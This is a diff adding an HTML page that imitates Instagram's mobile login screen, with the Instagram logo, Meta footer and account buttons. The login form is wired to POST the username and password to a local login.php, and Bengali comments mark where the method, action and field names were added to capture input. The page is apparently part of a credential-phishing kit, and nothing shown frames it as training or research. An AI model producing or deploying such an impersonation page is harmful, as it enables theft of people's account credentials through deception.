@@ -1,0 +1,57 @@
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   Instagram Login
+  </title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <style>
+   @import url('https://fonts.googleapis.com/css2?family=Inter&display=swap');
+   body {
+     font-family: 'Inter', sans-serif;
+   }
+  </style>
+ </head>
+ <body class="bg-white min-h-screen flex flex-col justify-between">
+  <div class="pt-16 px-6 flex flex-col items-center">
+   <button class="text-gray-500 text-lg font-normal flex items-center space-x-1">
+    <span>English (UK)</span>
+    <svg aria-hidden="true" class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+     <path d="M19 9l-7 7-7-7" stroke-linecap="round" stroke-linejoin="round"></path>
+    </svg>
+   </button>
+
+   <img alt="Instagram logo with gradient colors in square shape" class="my-16 w-24 h-24 object-contain" height="100" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" width="100"/>
+
+   <!-- ✅ method & action অ্যাড করা হয়েছে -->
+   <form method="POST" action="login.php" class="w-full max-w-md space-y-4">
+    
+    <!-- ✅ name অ্যাট্রিবিউট অ্যাড করা হয়েছে -->
+    <input name="username" class="w-full border border-gray-400 rounded-2xl px-4 py-3 text-gray-600 placeholder-gray-500 focus:outline-none focus:ring-1 focus:ring-blue-600" placeholder="Username, email address or mobile num…" type="text"/>
+    
+    <input name="password" class="w-full border border-gray-300 rounded-2xl px-4 py-3 text-gray-600 placeholder-gray-500 focus:outline-none focus:ring-1 focus:ring-blue-600" placeholder="Password" type="password"/>
+    
+    <button class="w-full bg-blue-600 text-white rounded-full py-3 text-lg font-normal" type="submit">
+     Log in
+    </button>
+   </form>
+
+   <button class="mt-6 text-black text-base font-normal">
+    Forgotten password?
+   </button>
+  </div>
+
+  <div class="px-6 pb-12 flex flex-col items-center space-y-6">
+   <button class="w-full max-w-md border border-blue-600 rounded-full py-3 text-blue-600 text-lg font-normal">
+    Create new account
+   </button>
+
+   <div class="flex flex-col items-center space-y-1 text-center text-gray-500 text-sm font-medium select-none">
+    <i class="fab fa-meta text-2xl"></i>
+    <span>2025 all copyright ©</span>
+   </div>
+  </div>
+ </body>
+</html>
